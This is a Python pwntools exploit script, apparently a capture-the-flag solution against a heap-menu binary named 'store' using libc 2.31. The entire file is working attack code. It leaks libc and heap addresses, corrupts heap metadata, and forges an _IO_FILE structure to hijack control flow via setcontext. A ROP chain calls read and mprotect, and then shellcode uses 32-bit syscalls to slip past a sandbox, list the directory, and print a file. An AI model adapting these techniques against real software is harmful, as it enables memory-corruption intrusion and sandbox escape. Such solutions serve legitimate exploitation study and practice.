from pwn import*
context(os='linux',arch='amd64',log_level='debug')

#s = process('./store')
s = remote('',)
libc = ELF('./libc-2.31.so')

def add(size,content1,content2):
	s.sendlineafter(b'choice: ', b'1')
	s.sendlineafter(b'Size: ', str(size))
	s.sendafter(b'Content: \n', content1)
	s.sendafter(b'Remark: \n', content2)

def delete(index):
	s.sendlineafter(b'choice: ', b'2')
	s.sendlineafter(b'Index: ', str(index))

def edit(index,content1,content2):
	s.sendlineafter(b'choice: ', b'3')
	s.sendlineafter(b'Index: ', str(index))
	s.sendafter(b'Content: \n', content1)
	s.sendafter(b'Remark: \n', content2)

def show(index):
	s.sendlineafter(b'choice: ', b'4')
	s.sendlineafter(b'Index: ', str(index))

add(0x420, b'a', b'a')
add(0x410, b'a', b'a')
delete(0)
s.sendlineafter(b'choice: ', b'1'*0x666)

show(0)
libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1ebfd0
success('libc_base=>' + hex(libc_base))

pop_rdi_ret = libc_base + 0x0000000000026b72
pop_rsi_ret = libc_base + 0x0000000000027529
pop_rdx_r12_ret = libc_base + 0x000000000011c371
jmp_rsi = libc_base + 0x000000000011074d
ret = pop_rdi_ret + 1

edit(0, b'a'*0x10, b'a')
show(0)
s.recvuntil(b'a'*0x10)
heap_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x290
success('heap_base=>' + hex(heap_base))
edit(0, p64(libc_base + 0x1ebfd0)*2 + p64(heap_base+0x290) + p64(libc_base + 0x1ec5a0 - 0x20), b'a')

delete(1)
s.sendlineafter(b'choice: ', b'1'*0x666)

fake_IO_file_addr = heap_base + 0xaf0

fake_IO_file = p64(0)*3 + p64(1)
fake_IO_file+= p64(0)*7 + p64(0) # _chain
fake_IO_file+= p64(0) + p64(0xffffffffffffffff) + p64(0)
fake_IO_file+= p64(heap_base + 0x1000) + p64(0xffffffffffffffff) + p64(0)
fake_IO_file+= p64(heap_base + 0x2a0) # _wide_data
fake_IO_file+= p64(0)*2 + p64(1) + p64(0)*3
fake_IO_file+= p64(libc_base + libc.sym['_IO_wfile_jumps'])

edit(1, fake_IO_file, fake_IO_file)

payload = b'\x00'*0xa0
payload+= p64(heap_base + 0x2a0 + 0xe0 + 0x10) + p64(ret)
payload+= b'\x00'*0x30 + p64(heap_base + 0x2a0 + 0xe0 + 8 - 0x68)
payload+= p64(libc_base + libc.sym['setcontext'] + 61)
payload+= p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(heap_base + 0x1000) + p64(pop_rdx_r12_ret) + p64(0x100) + p64(0) + p64(libc_base + libc.sym['read'])

payload+= p64(pop_rdi_ret) + p64((heap_base + 0x1000)&0xfffffffffffff000) + p64(pop_rsi_ret) + p64(0x3000) + p64(pop_rdx_r12_ret) + p64(7)  + p64(0) + p64(libc_base + libc.sym['mprotect'])

payload+= p64(pop_rsi_ret) + p64(heap_base + 0x1000) + p64(jmp_rsi)
edit(0, payload, payload)

success(hex(libc_base + libc.sym['setcontext'] + 61))
success(hex(libc_base + libc.sym['_IO_wfile_jumps']))
#gdb.attach(s, 'b _IO_wdoallocbuf')
#pause()

s.sendlineafter(b'choice: ', b'5')

shellcode = asm(
    '''
    mov rax, 0xc0
    mov rbx, 0x500000
    mov rcx, 0x5000
    mov rdx, 3
    mov rsi, 1048610
    xor rdi, rdi
    xor rbp, rbp
    int 0x80

    mov rsp, 0x500a00

    mov rax, 5
    push 0x2e
    mov rbx, rsp
    xor rcx, rcx
    int 0x80

    mov rbx, rax
    mov rax, 0x8d
    mov rcx, rsp
    mov rdx, 0x1337
    int 0x80

    add rcx, 106
    
    mov rax, 5
    mov rbx, rcx
    xor rcx, rcx
    xor rdx, rdx
    int 0x80

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch='amd64')

sleep(0.1)
s.sendline(shellcode)

s.interactive()
